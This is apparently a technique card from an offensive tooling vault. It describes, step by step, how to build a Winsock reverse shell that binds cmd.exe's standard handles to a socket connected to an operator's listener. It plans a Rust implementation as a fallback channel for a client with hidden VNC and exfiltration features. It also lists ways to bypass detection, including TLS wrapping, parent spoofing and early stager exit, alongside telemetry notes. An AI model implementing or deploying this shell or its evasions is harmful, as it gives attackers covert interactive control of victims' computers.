---
id: T-066
name: Winsock Reverse Shell via Handle Redirection
category: networking
tier: B
crate: none
source_file: none
mitre: T1059.003
mitre_secondary: [T1095]
tags: [reverse-shell, winsock, wsastartup, startupinfo, std-handle-redirection, createprocess, initial-access, interactive-shell]
origin: atlas-synthesis
member_notes: [lgtm:winsock-reverse-shell-primitive]
---

# Winsock Reverse Shell via Handle Redirection — Socket-Bound cmd.exe Spawn

## Summary

A Winsock reverse shell binds the standard input, output, and error handles of a newly spawned command interpreter to a connected TCP socket, producing a fully interactive text session over a raw network stream. The technique initializes the Winsock 2.2 stack with `WSAStartup(MAKEWORD(2,2))`, opens a stream socket to an operator-controlled listener, then populates `STARTUPINFOA` with `hStdInput`, `hStdOutput`, and `hStdError` all set to the socket handle and `dwFlags` set to `STARTF_USESTDHANDLES` before calling `CreateProcessA` with `bInheritHandles = TRUE`. Operators use it as a minimal initial-access foothold: a few dozen lines of code yield an interactive `cmd.exe` session capable of staging heavier tooling. The primary detection surface is the correlation of process creation telemetry (a `cmd.exe` child inheriting handles from a network-connected parent) against outbound connection telemetry, plus the presence of socket objects in the child's standard handle table.

## Mechanism

1. `WSAStartup(MAKEWORD(2,2), &wsaData)` negotiates Winsock version 2.2, loads `ws2_32.dll` into the stager process, and populates a `WSADATA` structure describing the negotiated implementation. Return code is validated before continuing.
2. `socket(AF_INET, SOCK_STREAM, IPPROTO_TCP)` (or `WSASocketA` with equivalent parameters) creates a stream socket. On Windows the returned `SOCKET` is a kernel handle backed by the Ancillary Function Driver and is inheritable by default.
3. A `sockaddr_in` structure is populated: `sin_family = AF_INET`, `sin_port = htons(port)`, `sin_addr.s_addr = inet_addr(ip)` of the operator listener.
4. `connect()` performs the TCP three-way handshake to the listener (ncat, Metasploit `multi/handler`, or an equivalent operator endpoint).
5. `STARTUPINFOA` is zeroed, then configured: `si.cb = sizeof(STARTUPINFOA)`, `si.dwFlags = STARTF_USESTDHANDLES`, and `si.hStdInput = si.hStdOutput = si.hStdError = (HANDLE)sock`. All three standard handles point at the single connected socket.
6. `CreateProcessA(NULL, "cmd.exe", NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi)` spawns the interpreter. `bInheritHandles = TRUE` is mandatory; without it the child receives default console handles and the redirection silently fails.
7. The child `cmd.exe` starts with its standard handle table entries referencing the socket. It detects that the handles are not console handles and falls back to `ReadFile`/`WriteFile`-driven I/O rather than console APIs.
8. A bidirectional stream is established: bytes typed at the listener arrive on the child's stdin via AFD-dispatched reads, and the child's stdout/stderr writes stream back over the same socket.
9. The stager either waits on `pi.hProcess` or exits. The TCP endpoint object persists while any process holds a handle reference, so the session survives stager termination through the inherited handle inside `cmd.exe`.

## OS Internals Context

Standard handle propagation is the mechanism that makes the technique function. When `STARTF_USESTDHANDLES` is set, `CreateProcess` copies the three handle values from `STARTUPINFOA` into the new process's `RTL_USER_PROCESS_PARAMETERS` block (`StandardInput`, `StandardOutput`, `StandardError` fields), which hangs off the PEB. `GetStdHandle(STD_INPUT_HANDLE)` in the child returns whatever value was placed there — there is no kernel-enforced requirement that these be console handles.

Handle inheritance requires two conditions simultaneously: the parent must pass `bInheritHandles = TRUE`, and the specific handle must carry `HANDLE_FLAG_INHERIT`. Sockets returned by `socket()` and by `WSASocket` without `WSA_FLAG_NO_HANDLE_INHERIT` are inheritable, which is why no `DuplicateHandle` or `SetHandleInformation` call is needed in the canonical pattern.

The reason a socket can serve as a standard handle at all is the Windows socket architecture. Unlike POSIX, where sockets are first-class file descriptors for every syscall, Windows sockets are HANDLEs referencing file objects created by the Ancillary Function Driver (`\Device\Afd`, `afd.sys`). `ReadFile` and `WriteFile` on a socket handle dispatch IRPs to AFD, which translates them into transport operations over TCP. This ReadFile/WriteFile overlap is sufficient for redirected shell I/O. Console-specific APIs such as `WriteConsoleA` fail on non-console handles, so `cmd.exe` probes its handles and selects the file-API code path — the same path used when output is piped to a file.

Endpoint ownership has operational consequences. The TCP endpoint is attributed (via `GetExtendedTcpTable`) to the PID that created the socket — the stager. The endpoint object itself persists while any handle references it, so the connection outlives the stager if `cmd.exe` holds the inherited copy. Handle enumeration with `NtQuerySystemInformation(SystemHandleInformation)` shows `\Device\Afd` handles in both processes for the duration.

The channel is plaintext TCP. Every keystroke and every output buffer is visible to network inspection, which is why this pattern appears in exploit-development material as a teaching scaffold and a short-lived foothold rather than a long-term channel.

## Key Implementation Details

**No current implementation in the HUGIN source.** This card documents the technique for future implementation.

An implementation would be a small `client_rust` module using `windows-sys::Win32::Networking::WinSock` (`WSAStartup`, `socket`, `connect`, `htons`, `inet_addr`) and `windows-sys::Win32::System::Threading` (`STARTUPINFOA`, `CreateProcessA`, `STARTF_USESTDHANDLES`). It could reuse the existing `tcp_transport.rs` connection establishment (T-022) but diverges at the final step: instead of framing protocol messages over the socket, it casts the socket to a `HANDLE`, populates `STARTUPINFOA`, and spawns the interpreter. The module would sit as a minimal fallback channel beneath the full client feature set documented in T-023.

## Why It Matters

The vault documents a full TCP transport, a hidden VNC desktop, and a 40-message binary protocol, but lacks the minimal primitive those capabilities replace. The handle-redirected reverse shell is the canonical first foothold in the exploit-development material: it compiles to a tiny stager, requires no protocol design, and delivers interactivity sufficient to stage the full client. Documenting it establishes the reference baseline against which T-022 and T-023 are the engineered successors, and gives operators a fallback when only a small payload fits the initial-access vector.

## Detection Considerations

- **Telemetry sources**: Sysmon Event ID 1 (process creation) captures `cmd.exe` spawning with its parent and command line; Sysmon Event ID 3 (network connection) captures the stager's outbound TCP connection; correlating the two by timestamp and host is the standard analytic. ETW providers `Microsoft-Windows-Kernel-Process` and `Microsoft-Windows-Kernel-Network`/TCPIP expose the same events. Handle-table inspection reveals `\Device\Afd` objects held by a `cmd.exe` process, and an interactive `cmd.exe` running without an associated `conhost.exe` console is anomalous on desktop sessions.
- **Bypass options**: wrapping the stream in TLS removes plaintext visibility; substituting a less-signatured interpreter for `cmd.exe` weakens command-line analytics; spoofing the parent (T-015) or spawning the shell from a long-lived, normally-networked process breaks the parent-connection correlation; exiting the stager immediately after spawn removes the attributed socket owner from the TCP table.
- **Residual artifacts**: none on disk if the stager runs in-memory; `ws2_32.dll` loaded into a process whose IAT would not normally import Winsock is a static and memory-scan heuristic; Prefetch and Amcache record the stager binary if executed from disk.

The atlas material for this technique does not discuss detection; the sources above reflect standard Windows and Sysmon telemetry.

## Related Techniques

- **T-022 Network Suite** — provides the engineered TCP transport and protocol layer that supersedes this raw-stream primitive; connection-establishment code is shared.
- **T-023 Client Capabilities** — the full client feature set (screen capture, recon, exfiltration) that a reverse-shell foothold is typically used to stage.

## References

- Atlas material: atlas-exploit-dev-part1.md (units 14, 15)
- MITRE ATT&CK: [T1059.003 — Command and Scripting Interpreter: Windows Command Shell](https://attack.mitre.org/techniques/T1059/003/)
- LGTM notes: lgtm:winsock-reverse-shell-primitive

## Source Reference

No current implementation. See atlas material and MITRE reference for public tooling.